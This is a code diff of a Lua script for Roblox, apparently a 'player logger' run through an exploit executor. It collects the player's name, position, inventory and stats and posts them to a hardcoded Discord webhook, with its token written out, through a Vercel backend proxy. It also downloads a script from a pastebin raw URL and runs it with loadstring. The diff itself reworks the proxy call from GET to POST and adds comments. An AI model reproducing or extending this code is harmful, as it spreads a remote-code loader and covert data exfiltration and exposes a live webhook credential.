@@ -8,7 +8,7 @@ local BACKEND_BASE_URL = "https://backend-vercel-ashy.vercel.app/api"
 local REGISTER_URL = BACKEND_BASE_URL .. "/register.js"
 local INSTANCE_URL = BACKEND_BASE_URL .. "/instance"
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1378086156624990361/8qHKxSBQ8IprT1qFn1KkHDWsyRfKXPJkS_4OYzMkBC-PIhGClm0v36uIgzrVwtU1zXh6"
-local WEBHOOK_PROXY = "https://webhook-git-main-ahmadsaukanihsbs-projects.vercel.app"
+local BACKEND_SEND_URL = BACKEND_BASE_URL .. "/send.js"
 local EXTERNAL_SCRIPT_URL = "https://pastebin.com/raw/pfpzbXiF"
 
 local REPORT_INTERVAL = 300 -- 5 minutes
@@ -18,6 +18,8 @@ local DEBUG_MODE = true
 local player = Players.LocalPlayer
 local currentInstanceId = game.JobId
 local isRunning = true
+
+-- ====================== [UTILITY FUNCTIONS] ======================
 
 local function log(message)
     if DEBUG_MODE then
@@ -38,7 +40,7 @@ local function makeBackendRequest(url, method, data)
             Body = data and HttpService:JSONEncode(data)
         })
     end)
-
+    
     if success then
         return true
     else
@@ -52,10 +54,11 @@ local function collectDetailedData()
     if not character then
         character = player.CharacterAdded:Wait()
     end
-
+    
     local humanoid = character:FindFirstChildOfClass("Humanoid")
     local position = character:GetPivot().Position
-
+    
+    -- Inventory scanning
     local inventory = {}
     local backpack = player:FindFirstChild("Backpack")
     if backpack then
@@ -66,7 +69,8 @@ local function collectDetailedData()
             })
         end
     end
-
+    
+    -- Leaderstats scanning
     local stats = {}
     local leaderstats = player:FindFirstChild("leaderstats")
     if leaderstats then
@@ -74,7 +78,7 @@ local function collectDetailedData()
             stats[stat.Name] = stat.Value
         end
     end
-
+    
     return {
         player = {
             username = player.Name,
@@ -112,6 +116,7 @@ local function createRichEmbed(data, messageType)
         }
     }
 
+    -- Player Info
     table.insert(embed.fields, {
         name = "👤 Player Info",
         value = string.format(
@@ -124,6 +129,7 @@ local function createRichEmbed(data, messageType)
         inline = true
     })
 
+    -- Instance Info
     table.insert(embed.fields, {
         name = "🌐 Instance",
         value = string.format(
@@ -136,6 +142,7 @@ local function createRichEmbed(data, messageType)
         inline = true
     })
 
+    -- Character Info
     table.insert(embed.fields, {
         name = "⚔ Character",
         value = string.format(
@@ -147,6 +154,7 @@ local function createRichEmbed(data, messageType)
         inline = false
     })
 
+    -- Inventory
     if #data.inventory > 0 then
         local inventoryStr = ""
         for _, item in ipairs(data.inventory) do
@@ -159,6 +167,7 @@ local function createRichEmbed(data, messageType)
         })
     end
 
+    -- Stats
     if next(data.stats) ~= nil then
         local statsStr = ""
         for name, value in pairs(data.stats) do
@@ -174,43 +183,62 @@ local function createRichEmbed(data, messageType)
     return {embeds = {embed}}
 end
 
-local function sendToWebhook(message)
-    local encoded = HttpService:UrlEncode(message)
-    local url = WEBHOOK_PROXY .. "?webhook=" .. HttpService:UrlEncode(WEBHOOK_URL) .. "&content=" .. encoded
+-- ====================== [WEBHOOK VIA BACKEND PROXY] ======================
+
+local function sendToBackendProxy(contentOrPayload)
+    -- contentOrPayload bisa string (simple message) atau table (embed)
+    local payload = {
+        url = WEBHOOK_URL
+    }
+
+    if type(contentOrPayload) == "string" then
+        payload.content = contentOrPayload
+    elseif type(contentOrPayload) == "table" then
+        for k,v in pairs(contentOrPayload) do
+            payload[k] = v
+        end
+    end
 
     local success, response = pcall(function()
-        return HttpService:GetAsync(url)
+        return HttpService:RequestAsync({
+            Url = BACKEND_SEND_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            },
+            Body = HttpService:JSONEncode(payload)
+        })
     end)
 
-    if success then
-        log("✅ Webhook sent via proxy")
+    if not success then
+        log("❌ Failed to send webhook via proxy: " .. tostring(response))
     else
-        log("❌ Proxy webhook failed: " .. tostring(response))
+        log("✅ Webhook sent via proxy successfully")
     end
+    return success
+end
+
+local function sendToWebhook(message)
+    -- Kirim pesan biasa ke proxy backend
+    sendToBackendProxy(message)
 end
 
 local function sendEnhancedWebhook(messageType, customMessage)
-    local data = collectDetailedData()
-    local payload = createRichEmbed(data, messageType)
-
+    local collectedData = collectDetailedData()
+    local payload = createRichEmbed(collectedData, messageType)
+    
     if customMessage then
         payload.content = "**"..messageType.."**\n"..customMessage
     end
 
-    local encodedPayload = HttpService:UrlEncode(HttpService:JSONEncode(payload))
-    local url = WEBHOOK_PROXY .. "?webhook=" .. HttpService:UrlEncode(WEBHOOK_URL) .. "&json=" .. encodedPayload
-
-    local success, response = pcall(function()
-        return HttpService:GetAsync(url)
-    end)
-
-    if success then
-        log("✅ Enhanced webhook sent via proxy")
-    else
-        log("❌ Enhanced proxy webhook failed: " .. tostring(response))
+    local success = sendToBackendProxy(payload)
+    if not success then
+        log("❌ Enhanced webhook via proxy failed, fallback to simple direct webhook")
         sendToWebhook(messageType..": "..(customMessage or "No additional info"))
     end
 end
+
+-- ====================== [DATABASE LOGGING] ======================
 
 local function registerPlayer()
     local data = {
@@ -221,7 +249,7 @@ local function registerPlayer()
         gameId = game.GameId,
         timestamp = os.time()
     }
-
+    
     return makeBackendRequest(REGISTER_URL, "POST", data)
 end
 
@@ -235,40 +263,44 @@ local function updateInstanceStatus(status, extraData)
         status = status,
         timestamp = os.time()
     }
-
+    
     if extraData then
         for k, v in pairs(extraData) do
             data[k] = v
         end
     end
-
+    
     return makeBackendRequest(INSTANCE_URL, "POST", data)
 end
+
+-- ====================== [SCRIPT MONITORING] ======================
 
 local function executeExternalScript()
     local success, content = pcall(function()
         return game:HttpGet(EXTERNAL_SCRIPT_URL, true)
     end)
-
+    
     if not success then
         log("Failed to fetch external script: " .. tostring(content))
         return false
     end
-
+    
     local fn, err = loadstring(content)
     if not fn then
         log("Failed to load external script: " .. tostring(err))
         return false
     end
-
+    
     local success, result = pcall(fn)
     if not success then
         log("Script execution failed: " .. tostring(result))
         return false
     end
-
+    
     return true
 end
+
+-- ====================== [MAIN LOGIC] ======================
 
 local function periodicReporting()
     while isRunning do
@@ -281,20 +313,23 @@ end
 local function initialize()
     log("Initializing player logger for " .. player.Name)
     sendEnhancedWebhook("LOGGER_STARTED", "Player: "..player.Name)
-
+    
+    -- Initial registration
     if registerPlayer() then
         log("Successfully registered player")
     else
         log("Failed to register player")
     end
-
+    
+    -- Start periodic reporting
     spawn(periodicReporting)
-
+    
+    -- Track script execution
     updateInstanceStatus("script_started")
     sendEnhancedWebhook("SCRIPT_STARTED", "Executing external script")
-
+    
     local scriptSuccess = executeExternalScript()
-
+    
     if scriptSuccess then
         updateInstanceStatus("script_completed")
         sendEnhancedWebhook("SCRIPT_COMPLETED", "Execution successful")
@@ -304,18 +339,21 @@ local function initialize()
     end
 end
 
+-- Cleanup function
 local function shutdown()
     isRunning = false
     updateInstanceStatus("stopped")
     sendEnhancedWebhook("LOGGER_STOPPED", "Manual shutdown triggered")
 end
 
+-- Handle graceful shutdown (press End key)
 UserInputService.InputEnded:Connect(function(input, processed)
     if input.KeyCode == Enum.KeyCode.End then
         shutdown()
     end
 end)
 
+-- Start the logger
 local success, err = pcall(initialize)
 if not success then
     updateInstanceStatus("initialization_failed", {error = tostring(err)})
